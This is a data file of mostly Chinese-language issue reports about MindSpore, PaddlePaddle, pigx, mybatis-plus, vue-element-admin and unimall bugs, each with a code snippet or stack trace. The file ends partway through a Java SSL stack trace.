[CT][MS]grad with duplicate grad_position expect raise error,"grad接口，对位置求导，输入重复的下标后，被去重，结果不对 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :890e5a12 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph pytest test_grad_multi_in_single_out.py::test_grad_in2_out1_input_diff_shape raise ValueError   <code>: def test_grad_in2_out1_input_diff_shape(): ms_net = MsMatmul() x = np.random.rand(5, 3).astype(np.float32) y = np.random.rand(3, 4).astype(np.float32) sense_shape = (5, 4) fact = GradFactory(x, y) &gt; fact.grad_self_compare(ms_net, (0, 1, 0), sense_shape) self = &lt;MindSporeTest.interface.jvp.grad_factory.GradFactory object at 0x7f5873a12c10&gt; ms_net = MsMatmul&lt;&gt;, grad_pos = (0, 1, 0), sense_shape = (5, 4) def grad_self_compare(self, ms_net, grad_pos, sense_shape=None): if sense_shape is not None: if isinstance(sense_shape[0], tuple): usenses = [np.ones(shape).astype(np.float32) for shape in sense_shape] self.ms_sense = tuple([Tensor(v) for v in usenses]) self.tc_sense = tuple([tensor(v) for v in usenses]) else: sens = np.ones(sense_shape).astype(np.float32) self.ms_sense = Tensor(sens) self.tc_sense = tensor(sens) ms_grad = F.grad(ms_net, grad_pos)(*self.ms_inputs) grad_net = GradOfAllInputs(ms_net, sens_param=False) ga_grad = grad_net(*self.ms_inputs) if isinstance(grad_pos, tuple): for i, p in enumerate(grad_pos): &gt; allclose_nparray(ms_grad[i].asnumpy(), ga_grad[p].asnumpy(), 0.0001, 0.0001) E IndexError: tuple index out of range"
关于第一部分第6小节的改进,"你好, 我阅读了第六小节, 发现了一些小小的问题: 关于标题 根据编程文件的描述: 我认为应该改为. 而且根据定义, 文件显然不符合编程文件的定义, 我认为应该适当斟酌. 关于一些语言的分类 文件被分到了两个分类下, 而并没有给出合理的定义, 根据 bat, sh, sql以及vbs的作用, 我们可以下定义: (很显然, 编程文件的很多文件类型可以归为脚本文件. 所以, 我建议删除脚本文件的分类, 归为程序文件   <code>: 编程文件 编程文件主要依赖于对应的编程语言，是一个开源项目中占比最多的主要文件。 程序文件 *.exe *.py 脚本语言 由操作系统或编程语言解释器读取并运行的文件"
【Poisson】GPU后端SqrtGrad算子会出现计算NAN的场景,"调试Poisson lab SBert模型时遇到梯度溢出场景，定位1周时间，最后发现是SqrtGrad算子输出存在NAN引起。当Sqrt输入存在0时，输出y存在0， 此时反向梯度计算时，由于SqrtGrad算子内部有除0操作且没有保护，会出现梯度nan。进而导致整网溢出，问题很难定位. 下面代码是SqrtGrad算子的实现： / 硬件环境: /device GPU : -- MindSpore version (e.g., 2.0.0) : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph SBert网络脚本 python main.py 查看日志，overflow标志持续溢出，dump数据后发现SqrtGrad算子会出现NAN 不溢出   <code>: template &lt;typename T&gt; __global__ void SqrtGradKernel(const T *input, const T *dout, T *output, const size_t count) { for (size_t i = blockIdx.x * blockDim.x + threadIdx.x; i &lt; (count); i += blockDim.x * gridDim.x) { float input_f = static_cast&lt;float&gt;(input[i]); float dout_f = static_cast&lt;float&gt;(dout[i]); float res_vmul = dout_f / (2.0 * input_f); output[i] = static_cast&lt;T&gt;(res_vmul); } return; }"
[Discuss] the expected behavior when bias_attr (type of ParamAttr) set to None,"is a function parameter to convolution layers like sequence_conv, conv2d, conv3d etc. According to this issue its acceptable to set bias_attr in a lot of ways, especially when set to True/False it will turn on/off using bias entirely. Today when one user asked if setting to (not or ) will turn off using bias, I checked the source code and find that this will actually not, because the method will return a ParamAttr object even if the required key doesn't exist: The problem is in , which will create a new ParamAttr object when the argument is None: Following this logic, when of conv2d() layer is passed in , fluid will add an bias. I'd ask if this is intended behavior, and if so, please make better documentation on , , and other alike layers which use as a parameter. Thanks.   <code>: bias_attr def conv2d(input, num_filters, filter_size, stride=1, padding=0, dilation=1, groups=None, param_attr=None, bias_attr=None, use_cudnn=True, use_mkldnn=False, act=None, name=None) bias_attr None True False LayerHelper.bias_attr() attr = ParamAttr._to_attr(self.kwargs.get('bias_attr', None)) ParamAttr._to_attr() if arg is None: return ParamAttr() bias_attr None sequence_conv conv2d conv3d bias_attr"
[CT][MS][OCCM][inplacesub]算子出现 RuntimeError: Unsupported op [InplaceSub] on GPU,"正向报错 提示 E RuntimeError: Unsupported op [InplaceSub] on GPU, Please confirm whether the device target setting is corr ect, or refer to 'mindspore.ops' at https://www.mindspore.cn to query the operator support list. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:626 SetOperatorInfo /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/mindspore/common/api.py:974: RuntimeError test_inplacesub.py:121: ../share/ops/primitive/inplacesub_ops.py:60: in forward_func_cmp out_me = self.forward_mindspore_func_impl() ../share/ops/primitive/inplacesub_ops.py:42: in forward_mindspore_func_impl out = ops.inplace_sub(input_x_me, input_v_me, self.indices) /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/mindspore/ops/function/math_func.py:1294: in inplace_ sub return inplace_sub_inner(x, v) /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/mindspore/ops/primitive.py:314: in call return _run_op(self, self.name, args) /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/nisong3.71/lib/python3.7/site-packages/mindspore/ops/primitive.py:802: in _run_op output = _pynative_executor.real_run_op(obj, op_name, args) self = &lt;mindspore.common.api._PyNativeExecutor object at 0x7f0ccc2a8310&gt; args = (Prim[InplaceSub]&lt;indices=(0, 1, 2, 3)&gt;, 'InplaceSub', (Tensor(shape=[16, 8, 8, 4, 4], dtype=Float32, value [[[[[ 1.3...+00, 4.82462257e-01, 1.16982222e+00], [-3.67658943e-01, -6.74091339e-01, -2.95669854e-01, 1.53103614e+00]]]]]))) E RuntimeError: Unsupported op [InplaceSub] on GPU, Please confirm whether the device target setting is corr ect, or refer to 'mindspore.ops' at https://www.mindspore.cn to query the operator support list. Hardware Environment() / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_inplacesub_input_func_5d_7d test_p_inplacesub_input_32_8_128_ind_28_float32 test_inplacesub_input_1d_float16 test_inplacesub_input_2d_float32 test_inplacesub_input_3d_float64 在 GPU后端出现，两种模式之一，安装whl包 版本号： commit_id = ''[sha1]:8ea6edeb,[branch]:(HEAD,mr-origin-45572)'' 运行库上用例test_p_inplacesub_input_func_5d_7d 出现报错 正常用例 用例通过   <code>: def test_p_inplacesub_input_func_5d_7d(): fact = InplaceSubFactory(input_shape=(16, 8, 8, 4, 4), target_shape=(4, 8, 8, 4, 4), indices=(0, 1, 2, 3), dtype=np.float32) fact.forward_func_cmp() def real_run_op(self, *args): """""" Run single op. Args: args (tuple): Op prim and input arguments. Return: Tensor, result of run op. """""" return self._executor.real_run_op(*args)"
c  预测库 bad_alloc,"标题：1.4.0 c++ cuda 预测库，load模型是报错bad_alloc 1）PaddlePaddle版本：paddlepaddle/paddle:1.4.0-gpu-cuda9.0-cudnn7 2）CPU： 3）GPU：V100 4）系统环境：官方docker，下载的是 官网的1.4的c++的fuild_inference.tgz。 cuda9.0 cudnn7的。在同一个docker中，对应的python版本能正确运行。 复现信息： CreatePaddlePredictor 出现： 用gdb看： 仔细看了源码的位置，没看到特殊的地方，请帮忙指导一下。   <code>: ELOG(DEBUG) &lt;&lt; ""Load graph, this may take a while. (PADDLEFLUID)""; paddle::NativeConfig config; config.use_gpu = ue; config.device = 1; config.fraction_of_gpu_memory = 0.15; ELOG(DEBUG) &lt;&lt; ""Thread num "" &lt;&lt; config.cpu_math_library_num_threads() &lt;&lt; "", use gpu="" &lt;&lt; config.use_gpu; config.prog_file = prog_file; config.param_file = params_file; _predictor = paddle::CreatePaddlePredictor&lt; paddle::NativeConfig, paddle::PaddleEngineKind::kNative &gt;(config); 2019-04-26 15:19:58,437 DEBUG [EasyEdge] [paddlefluid_edge_predictor.cpp:50] 140454807502464 Load graph, this may take a while. (PADDLEFLUID) 2019-04-26 15:19:58,437 DEBUG [EasyEdge] [paddlefluid_edge_predictor.cpp:56] 140454807502464 Thread num 4, use gpu=0 terminate called after throwing an instance of 'std::bad_alloc' what(): std::bad_alloc Aborted (core dumped) Using host libthread_db library ""/lib/x86_64-linux-gnu/libthread_db.so.1"". Core was generated by `./easyedge_demo ../model/easydl_20434.inceptionv3.fluid/ 1.jpeg'. Program terminated with signal SIGABRT, Aborted. #0 0x00007fbe2d7a7428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. [Current thread is 1 (Thread 0x7fbe2ee87e80 (LWP 95766))] (gdb) bt #0 0x00007fbe2d7a7428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54 #1 0x00007fbe2d7a902a in __GI_abort () at abort.c:89 #2 0x00007fbe2dde184d in __gnu_cxx::__verbose_terminate_handler() () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #3 0x00007fbe2dddf6b6 in ?? () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #4 0x00007fbe2dddf701 in std::terminate() () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #5 0x00007fbe2dddf919 in __cxa_throw () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #6 0x00007fbe2dddfebc in operator new(unsigned long) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #7 0x00007fbe2de20e39 in std::string::_Rep::_S_create(unsigned long, unsigned long, std::allocator&lt;char&gt; const&amp;) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #8 0x00007fbe2de21c6b in std::string::_Rep::_M_clone(std::allocator&lt;char&gt; const&amp;, unsigned long) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #9 0x00007fbe2de2236c in std::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string(std::string const&amp;) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6 #10 0x00007fbe19ee6310 in paddle::NativePaddlePredictor::NativePaddlePredictor(paddle::NativeConfig const&amp;) () from /home/work/chenxiaoyu/ggit/baidu/easyedge/cpp-sdk/EasyEdge/thirdparty/lib/x86-GPU/libpaddle_fluid.so #11 0x00007fbe19ee0ce2 in std::unique_ptr&lt;paddle::PaddlePredictor, std::default_delete&lt;paddle::PaddlePredictor&gt; &gt; paddle::CreatePaddlePredictor&lt;paddle::NativeConfig, (paddle::PaddleEngineKind)0&gt;(paddle::NativeConfig const&amp;) () from /home/work/chenxiaoyu/ggit/baidu/easyedge/cpp-sdk/EasyEdge/thirdparty/lib/x86-GPU/libpaddle_fluid.so #12 0x00007fbe2ea63516 in easyedge::PaddleFluidEdgePredictor::init (this=0x21091e0) at /home/work/chenxiaoyu/ggit/baidu/easyedge/cpp-sdk/EasyEdge/easyedge/engine/paddlefluid_edge_predictor.cpp:64 #13 0x000000000040411e in main (argc=3, argv=0x7ffe7abf3608) at /home/work/chenxiaoyu/ggit/baidu/easyedge/cpp-sdk/EasyEdge/demo/demo.cpp:84 (gdb)"
getter方法生成代码没有驼峰,2.1.2版本： 对于数据库字段 wPerSec 生成的entity方法为 2.0.7版本正常：   <code>: public Float getwPerSec() { return wPerSec; } public void setwPerSec(Float wPerSec) { this.wPerSec = wPerSec; } public Float getWPerSec() { return wPerSec; } public void setWPerSec(Float wPerSec) { this.wPerSec = wPerSec; }
登录事件日志保存到 sys_log 表,环境信息 pigx版本: 3.8 是否修改包名: 否 重构 successEvent、failevent 处理，利用 spring event 异步保存关键信息到 日志表   <code>: AuthenticationFailureHandler AuthenticationSuccessHandler
pig-ui启动报错,"pig版本:2.2.0 操作系统:windows10 是否修改包名: 没有修改 启动前段报错：   <code>: D:\demo\pig-ui&gt;npm run dev &gt; pig-ui@1.1.5 dev D:\demo\pig-ui &gt; webpack-dev-server --inline --progress --config build/webpack.dev.conf.js 94% asset optimization ERROR Failed to compile with 1 errors 10:45:41 AM error in ./~/_element-ui@2.9.1@element-ui/packages/form/src/label-wrap.vue Syntax Error: Unexpected token (23:14) 21 | } 22 | } &gt; 23 | return (&lt;div class=""el-form-item__label-wrap"" style={style}&gt; | ^ 24 | { slots } 25 | &lt;/div&gt;); 26 | } else {"
固定 tag 上选择关闭所有时，非固定 tags 关闭了，但页面未关闭。,"Bug report（问题描述） 固定 tag 上选择关闭所有时，非固定 tags 关闭了，但页面未关闭。 Steps to reproduce（问题复现步骤） 打开 vue-element-admin 提供的线上演示项目地址：https://panjiachen.gitee.io/vue-element-admin/#/login?redirect=%2Fdashboard，登录后进入到首页。 任意打开几个非固定的页面。 鼠标移动到首页或文档的 tag 标签上，打开右键菜单。 选择关闭所有 Screenshot or Gif（截图或动态图） 附上我的修改方式 修改了 src\layout\components\TagsView\index.vue 文件中的 closeAllTags 方法。   <code>: closeAllTags(view) { this.$store.dispatch('tagsView/delAllViews').then(({ visitedViews }) =&gt; { if (this.affixTags.some(tag =&gt; tag.path === view.path)) { // 直接跳转到当前鼠标所在 tag 对应的页面 this.$router.push(view) return } this.toLastView(visitedViews, view) }) },"
当表中包含被下划线分割的同名字段时查询会失效,"当前使用版本 当表中包含被下划线分割的同名字段时查询会失效 例如，后面会写出来 MySQL：user表中有两个字段 实体类：针对每个属性都配置了TableField属性 执行查询后两个字段都查不到值 注释掉实体类其中一个字段后，另一个查询就会正常 无报错信息   <code>: &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.5.1&lt;/version&gt; &lt;/dependency&gt; create_user和createuser create_user和createuser CREATE TABLE `sys_user` ( `id` bigint(20) unsigned NOT NULL COMMENT '主键ID', `name` varchar(64) DEFAULT NULL COMMENT '姓名', `gender` char(1) DEFAULT NULL COMMENT '性别', `birthday` date DEFAULT NULL COMMENT '生日', `create_user` bigint(20) DEFAULT NULL COMMENT '创建人', `createuser` bigint(20) DEFAULT NULL COMMENT '创建人-测试字段', `create_time` datetime DEFAULT NULL COMMENT '创建时间', `update_time` datetime DEFAULT NULL COMMENT '更新时间', `deleted` bit(1) NOT NULL DEFAULT b'0' COMMENT '逻辑删除', PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户表'; @Data public class SysUser { // 省略其他字段... @TableField(value = ""create_user"") private Long createUser; @TableField(value = ""createuser"") private Long createuser; } @GetMapping(""/test"") public String test() { service.list().forEach(System.out::println); return ""test success!""; } // SysUser(id=1547098995262754817, name=123, gender=1, birthday=2000-03-04, createUser=null, createuser=null) // SysUser(id=1547098995900289026, name=123, gender=1, birthday=2000-03-04, createUser=null, createuser=null) @Data public class SysUser { // 省略其他字段... @TableField(value = ""create_user"") private Long createUser; // @TableField(value = ""createuser"") // private Long createuser; } // SysUser(id=1547098995262754817, name=123, gender=1, birthday=2000-03-04, createUser=1) // SysUser(id=1547098995900289026, name=123, gender=1, birthday=2000-03-04, createUser=1)"
go pserver free memory error,"Go pserver free memory twice error.   <code>: time=""2017-07-14T10:42:13+08:00"" level=info msg=""New Optimizer Created with config:"" ConfigSize=50 ElementType=4 ParamSize=2500 StateSize=0 client.test(45331,0x70000386f000) malloc: *** error for object 0x59058a8: incorrect checksum for freed object - object was probably modified after being freed. *** set a breakpoint in malloc_error_break to debug SIGABRT: abort PC=0x7fffbb48adda m=5 sigcode=0 signal arrived during cgo execution goroutine 262 [syscall, locked to thread]: runtime.cgocall(0x46f7da0, 0xc4204c5860, 0x487aa4d) /usr/local/opt/go/libexec/src/runtime/cgocall.go:131 +0x8b fp=0xc4204c5820 sp=0xc4204c57e8 github.com/PaddlePaddle/Paddle/go/pserver._Cfunc_paddle_update_parameter(0x5b00300, 0xc400000004, 0xc42046a000, 0x271, 0x0) github.com/PaddlePaddle/Paddle/go/pserver/_obj/_cgo_gotypes.go:142 +0x6b fp=0xc4204c5860 sp=0xc4204c5820 github.com/PaddlePaddle/Paddle/go/pserver.(*optimizer).UpdateParameter.func1(0xc420011c40, 0x4, 0x4, 0xc42046a000, 0x9c4, 0x9c4, 0x5b00300, 0x4, 0xc42046a000$ 0xc400000271, ...) /Users/dzh/.go/src/github.com/PaddlePaddle/Paddle/go/pserver/optimizer.go:81 +0x150 fp=0xc4204c58b8 sp=0xc4204c5860 github.com/PaddlePaddle/Paddle/go/pserver.(*optimizer).UpdateParameter(0xc420139e90, 0xc420011c40, 0x4, 0x4, 0xc42046a000, 0x9c4, 0x9c4, 0x40be6d3, 0x40cfc22$ /Users/dzh/.go/src/github.com/PaddlePaddle/Paddle/go/pserver/optimizer.go:81 +0x107 fp=0xc4204c5988 sp=0xc4204c58b8 github.com/PaddlePaddle/Paddle/go/pserver.(*Service).SendGrad(0xc42019c440, 0xc420011c40, 0x4, 0x4, 0xc42046a000, 0x9c4, 0x9c4, 0xc420011c48, 0x0, 0x0) /Users/dzh/.go/src/github.com/PaddlePaddle/Paddle/go/pserver/service.go:194 +0x18f fp=0xc4204c5a20 sp=0xc4204c5988 runtime.call128(0xc42019e7e0, 0xc4201b80c0, 0xc4201ad9f0, 0x4000000050) /usr/local/opt/go/libexec/src/runtime/asm_amd64.s:516 +0x66 fp=0xc4204c5ab0 sp=0xc4204c5a20"
PPrimitive doesn't support unspecified tokens/nodes,"RFC PPRimitive in Pattern Matcher doesn't support unspecified tokens/nodes enhancement There are cases where we want to explicitly define some of the tokens of a Pattern and others might remain unspecified, but still the Pattern should be valid. Currently, for a Pattern to be matched, the number of input nodes must be exactly the same number of tokens in the Pattern. ##Variadic number of inputs in Pattern. To support a variadic number of inputs in a Pattern we propose the inclusion of a new function: This function sets the PPrimitive or the PCNode object to capture at least nodes after the last one defined in the Pattern. e.g. means the Pattern will be valid if there is one or more nodes after the last one specified when building the PPrimitive or the PCNode. For instance: will capture any Primitive CNode that is a Switch primitive with 3 or more inputs. Even if the rest of the inputs (after z) are not explicitly defined in the Pattern they're captured and the Pattern is valid. Trail No. Task Description Related Issue(URL) 1 2   <code>: const PPrimitive&lt;TArgs...&gt; &amp;MinExtraNodes(const size_t &amp;min_extra_nodes = 0) min_extra_nodes_ min_extra_nodes_ = 1 MATCH_REPLACE(node, PPrimitive(prim::kSwitch, x, y, z).MinExtraNodes(0), y);"
如何实现Quartz Rest类型 服务调用（不对外暴露接口）,"环境信息 pigx版本: 3.9.0 是否修改包名: 是 1. 新建任务, 选择类型Rest 2. 调用内部接口 问题描述 如何不修改pigx原本的代码情况， 实现quartz rest类型微服务之间，跨服务调用（不对外暴露接口）。   <code>: 执行路径 http://cloud-gateway:9999/dms/get @RestController public class DataSourceTaskApiController { @Inner(value = false) @GetMapping(""/get"") public void get(){ System.out.println(""123123""); } }"
[CT][MS][aicpu-ScaleAndTranslate] forward has precision error,"输入image dtype int16, 'kernel_type': ""gaussian"", 'antialias': True， 正向输出对比有精度问题， 如果换成如下取值， 执行3次无精度问题 /mode graph 执行测试用例 结果正确， 对比标杆通过   <code>: def test_scaleandtranslate_image_shape_4d_dtype_int16_kernel_type_gaussian_antialias_true(): images = Tensor(np.random.randint(-255, 255, size=(64, 58, 32, 68)).astype(np.int16)) size = Tensor(np.random.randint(100, 200, size=(2,)).astype(np.int32)) scale = Tensor(np.random.uniform(1, 320, size=(2,)).astype(np.float32)) translation = Tensor(np.random.randint(-20, 100.0, size=(2,)).astype(np.float32)) fact = ScaleAndTranslateMock(attributes={'kernel_type': ""gaussian"", 'antialias': True}, inputs=[images, size, scale, translation]) &gt; fact.forward_cmp() def test_scaleandtranslate_image_shape_4d_dtype_int16_kernel_type_gaussian_antialias_true(): images = Tensor(np.random.randint(-255, 255, size=(64, 58, 32, 68)).astype(np.int16)) size = Tensor(np.random.randint(100, 200, size=(2,)).astype(np.int32)) scale = Tensor(np.random.uniform(1, 320, size=(2,)).astype(np.float32)) translation = Tensor(np.random.randint(-20, 100.0, size=(2,)).astype(np.float32)) fact = ScaleAndTranslateMock(attributes={'kernel_type': ""gaussian"", 'antialias': True}, inputs=[images, size, scale, translation]) &gt; fact.forward_cmp() E AssertionError: E data_expected_std:[ 7.5085764 14.8396225 -179.8969 ... 10.374982 -45.295433 E -32.09624 ] E data_me_error:[ 7.5085907 14.839611 -179.89688 ... 10.374981 -45.29544 E -32.096252 ] E loss:[1.4305115e-05 1.1444092e-05 1.5258789e-05 ... 9.5367432e-07 7.6293945e-06 E 1.1444092e-05]"
微信小程序中，使用微信登录的时候失败,"问题描述：微信小程序中，使用微信登录的时候失败 我已在配置中替换了微信中的 com.iotechn.unimall.wx.mini.app-id= com.iotechn.unimall.wx.mini.app-secret= 相关错误如下   <code>: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target at sun.security.ssl.Alerts.getSSLException(Alerts.java:192) ~[na:1.8.0_131] at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1949) ~[na:1.8.0_131] at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:302) ~[na:1.8.0_131] at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:296) ~[na:1.8.0_131] at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1514) ~[na:1.8.0_131] at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:216) ~[na:1.8.0_131] at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1026) ~[na:1.8.0_131] at sun.security.ssl.Handshaker.process_record(Handshaker.java:961) ~[na:1.8.0_131] at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_131] at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_131] at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_131] at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_131] at okhttp3.internal.connection.RealConnection.connectTls(RealConnection.java:302) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.connection.RealConnection.establishProtocol(RealConnection.java:270) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.connection.RealConnection.connect(RealConnection.java:162) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.connection.StreamAllocation.findConnection(StreamAllocation.java:257) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.connection.StreamAllocation.findHealthyConnection(StreamAllocation.java:135) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.connection.StreamAllocation.newStream(StreamAllocation.java:114) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.java:42) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.cache.CacheInterceptor.intercept(CacheInterceptor.java:93) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.BridgeInterceptor.intercept(BridgeInterceptor.java:93) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept(RetryAndFollowUpInterceptor.java:126) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) ~[okhttp-3.10.0.jar:na] at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121) ~[okhttp-3.10.0.jar:na] at okhttp3.RealCall.getResponseWithInterceptorChain(RealCall.java:200) ~[okhttp-3.10.0.jar:na] at okhttp3.RealCall.execute(RealCall.java:77) ~[okhttp-3.10.0.jar:na] at com.iotechn.unimall.app.api.user.UserServiceImpl.wechatLogin(UserServiceImpl.java:370) ~[classes/:na] at com.iotechn.unimall.app.api.user.UserServiceImpl.thirdPartLogin(UserServiceImpl.java:250) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_131] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_131] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_131] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_131] at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:343) [spring-aop-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:198) [spring-aop-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) [spring-aop-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:294) ~[spring-tx-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:98) ~[spring-tx-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) [spring-aop-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) ~[spring-aop-5.1.4.RELEASE.jar:5.1.4.RELEASE] at com.sun.proxy.$Proxy102.thirdPartLogin(Unknown Source) ~[na:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_131] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_131] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_131] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_131] at com.iotechn.unimall.launcher.controller.ApiController.process(ApiController.java:231) ~[classes/:na] at com.iotechn.unimall.launcher.controller.ApiController.invoke(ApiController.java:67) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_131] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_131] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_131] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_131] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:189) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:800) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1038) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:660) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) ~[spring-webmvc-5.1.4.RELEASE.jar:5.1.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) 